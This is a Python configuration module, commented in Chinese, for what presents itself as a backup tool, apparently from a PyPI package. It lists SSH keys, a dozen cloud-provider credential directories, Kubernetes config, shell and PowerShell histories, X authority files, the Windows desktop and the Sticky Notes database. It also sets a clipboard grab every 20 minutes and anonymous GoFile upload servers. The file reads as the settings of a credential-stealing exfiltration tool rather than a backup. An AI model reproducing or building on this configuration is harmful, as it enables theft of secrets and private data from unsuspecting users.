# -*- coding: utf-8 -*-
"""
备份配置模块
"""

import os
from pathlib import Path


class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1000  # 上传超时时间（秒）
    
    # 监控配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）260000
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）1200
    
    # 超时配置
    WSL_BACKUP_TIMEOUT = 3600  # WSL备份超时时间（秒，1小时）
    NETWORK_CONNECTION_TIMEOUT = 3  # 网络连接超时时间（秒）
    PROGRESS_REPORT_INTERVAL = 60  # 进度报告间隔（秒）
    
    # 文件操作配置
    FILE_COPY_BUFFER_SIZE = 1024 * 1024  # 文件复制缓冲区大小（1MB）
    TAR_COMPRESS_LEVEL = 9  # tar压缩级别（0-9，9为最高压缩）
    COMPRESSION_RATIO = 0.7  # 压缩比例估计值（压缩后约为原始大小的70%）
    SAFETY_MARGIN = 0.7  # 安全边界（分块时留出30%的余量）
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/pypi-Backup/backup.log")
    
    # WSL指定备份目录或文件（相对于 WSL 用户主目录）
    WSL_SPECIFIC_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
        # VPS服务商配置目录
        ".aws",               # AWS配置
        ".gcloud",            # Google Cloud配置
        ".azure",             # Azure配置
        ".aliyun",            # 阿里云配置
        ".tencentcloud",      # 腾讯云配置
        ".tccli",             # 腾讯云CLI配置
        ".doctl",             # DigitalOcean配置
        ".hcloud",            # Hetzner配置
        ".vultr",             # Vultr配置
        ".linode",            # Linode配置
        ".oci",               # Oracle Cloud配置
        ".bandwagon",         # 搬瓦工配置
        ".bwg",               # 搬瓦工配置
        ".kube",              # Kubernetes配置
    ]
    
    # Windows 用户主目录（WSL 下的挂载路径）
    _WIN_USER_HOME = None
    try:
        # 尝试从环境变量推断 Windows 用户目录（例如：/mnt/c/Users/<user>）
        win_user = os.environ.get("WIN_USER") or os.environ.get("USERNAME") or os.environ.get("USER")
        if win_user:
            _candidate_home = os.path.join("/mnt/c/Users", win_user)
            if os.path.isdir(_candidate_home):
                _WIN_USER_HOME = _candidate_home
    except Exception:
        _WIN_USER_HOME = None

    # 自动检测 Windows 桌面目录（支持 Desktop/桌面/OneDrive 等）
    if _WIN_USER_HOME:
        _DESKTOP_CANDIDATES = [
            os.path.join(_WIN_USER_HOME, "Desktop"),
            os.path.join(_WIN_USER_HOME, "桌面"),
            os.path.join(_WIN_USER_HOME, "OneDrive", "Desktop"),
            os.path.join(_WIN_USER_HOME, "OneDrive", "桌面"),
        ]
        for _path in _DESKTOP_CANDIDATES:
            if os.path.exists(_path):
                WINDOWS_DESKTOP_RELATIVE_PATH = os.path.relpath(_path, _WIN_USER_HOME).replace("\\", "/")
                break
        else:
            WINDOWS_DESKTOP_RELATIVE_PATH = "Desktop"
    else:
        WINDOWS_DESKTOP_RELATIVE_PATH = "Desktop"

    # 自动检测 Windows 便签 plum.sqlite 的相对路径
    if _WIN_USER_HOME:
        _LOCAL_APPDATA = os.path.join(_WIN_USER_HOME, "AppData", "Local")
        _PACKAGES_DIR = os.path.join(_LOCAL_APPDATA, "Packages")
        WINDOWS_STICKY_NOTES_RELATIVE_PATH = (
            "AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
        )
        try:
            if os.path.isdir(_PACKAGES_DIR):
                for _entry in os.listdir(_PACKAGES_DIR):
                    if "StickyNotes" in _entry:
                        _candidate = os.path.join(_PACKAGES_DIR, _entry, "LocalState", "plum.sqlite")
                        if os.path.exists(_candidate):
                            WINDOWS_STICKY_NOTES_RELATIVE_PATH = os.path.relpath(
                                _candidate, _WIN_USER_HOME
                            ).replace("\\", "/")
                            break
        except Exception:
            pass
    else:
        WINDOWS_STICKY_NOTES_RELATIVE_PATH = (
            "AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
        )

    # Windows指定备份目录或文件（相对于 Windows 用户目录 /mnt/c/Users/{user}）
    WINDOWS_SPECIFIC_PATHS = [
        WINDOWS_DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
        WINDOWS_STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测，失败则使用默认路径）
        ".python_history",  # Python 历史记录文件
        ".node_repl_history",  # Node.js REPL 历史记录文件
        "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell 历史
        "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]
